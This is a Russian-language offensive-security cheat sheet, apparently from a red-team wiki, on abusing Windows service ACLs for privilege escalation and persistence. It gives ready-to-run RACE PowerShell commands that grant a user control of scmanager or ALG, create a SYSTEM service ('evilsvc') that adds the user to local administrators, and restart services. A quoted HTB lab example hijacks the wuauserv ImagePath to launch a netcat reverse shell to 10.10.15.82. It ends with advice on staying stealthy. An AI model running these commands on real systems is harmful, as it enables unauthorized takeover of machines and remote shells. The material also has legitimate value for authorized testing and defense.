# Windows Services / ACL

## Intro

Службы Windows очень полезны для persistance и getting admin privileges back

* Имея права администратора, мы можем создавать новые или изменять существующие сервисы для запуска от SYSTEM
* Мы также можем изменять ACL таких сервисов, для предоставление разрешений для настройки и перезапуска от того пользователя, которого мы контролируем
* От лица того пользователя, которого мы контролируем, перенастраиваем выбранный сервис на выбранной машине так, чтобы запускался в итоге наш payload
* Перезапускаем сервис для запуска нашего payload'а

## Tools

В варианте ниже используется RACE: [https://github.com/samratashok/RACE](https://github.com/samratashok/RACE)\
Другая для павна ACL: [https://github.com/fox-it/Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn)

## Создание нового сервиса

Команда ниже предоставляет для _labuser_ **GenericAll** права через **scmanager** (нужны права администратора)

```
Set-RemoteServicePermissions -SamAccountName labuser -ComputerName ops-build -ServiceName scmanager -Verbose
```

_labuser_ теперь может создавать сервисы на интересующей машине:

```
Set-RemoteServiceAbuse -ComputerName ops-build -UserName 'ops\labuser' -CreateService evilsvc -SamAccountName labuser -Verbose
```

Приведенная выше команда устанавливает тип запуска службы Auto, а учетную запись - LocalSystem. Для пути до бинаря или исполняемого файла сервиса определеная специальный payload. По умолчанию, payload добавляет пользователя, определенного в UserName параметре, в группу локальных администраторов.&#x20;

Тепеь нам надо дождать когда перезагрузится сервис или система вцелом.&#x20;

Если не хотим ждать, можем запустить команду ниже с привилегиями администратора на интересующей машине для получения прав на перезапуск созданного сервиса для нашего пользователя:

```
Set-RemoteServicePermissions -SamAccountName labuser -ServiceName evilsvc -ComputerName ops-build -Verbose
```

Теперь мы можем перезапустить evilsvc, пользователь labuser будет добавлен в группу локальных администраторов на интересующей машине.

```
sc.exe \\ops-build start evilsvc
```

## Изменение существующего сервиса

Имея права, эквивалентные администраторским ([CCDCLCSWRPWPDTLOCRSDRCWDWO](https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings)) права на каком-нибудь сервисе, мы можем произвести PrivEsc на нем.&#x20;

Команда ниже изменяет _ACL_ для сервиса _ALG_ на интересующей машине для предоставлния _labuser_ прав на настройку и перезапуск сервиса:

```
Set-RemoteServicePermissions -SamAccountName labuser -ComputerName ops-build -ServiceName ALG -Verbose
```

Запустим следующую команду от пользователя _labuser_:

```
Set-RemoteServiceAbuse -ComputerName ops-build -UserName 'ops\labuser' -ServiceName ALG -Verbose -SamAccountName labuser -Verbose
Enter-PSSession -ComputerName ops-build
[ops-build]: PS> net localgroup administrators 
```

Теперь, после перезапуска сервиса, пользователь будет добавлен в локальную группу.

### Другой пример - [HTB Control](https://habr.com/ru/post/499060/):

```
Получаем все службы и разрешения для текущего пользователя Hector
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "Hector Users Path"

Просматривая вывод, замечаем, что Гектор имеет полные права на службу обновления Windows — wuauserv.
Службы в операционной системе Windows выполняются с правами System. 
При регистрации службы в системе, путь к исполняемому файлу службы охраняется в атрибуте ImagePath. 
Давайте изменим значение данного атрибута и загрузим шелл.
reg add "HKLM\System\CurrentControlSet\Services\wuauserv" /v ImagePath /t REG_SZ /d "C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"

Теперь запустим службу обновления.
start-service wuauserv
```

## Важные замечания

Оба метода попадают в логи: создание сервиса, изменения и запуск/останов. _Таким образом, этот метод не рекомендуется для DC или когда вы хотите быть скрытным_.
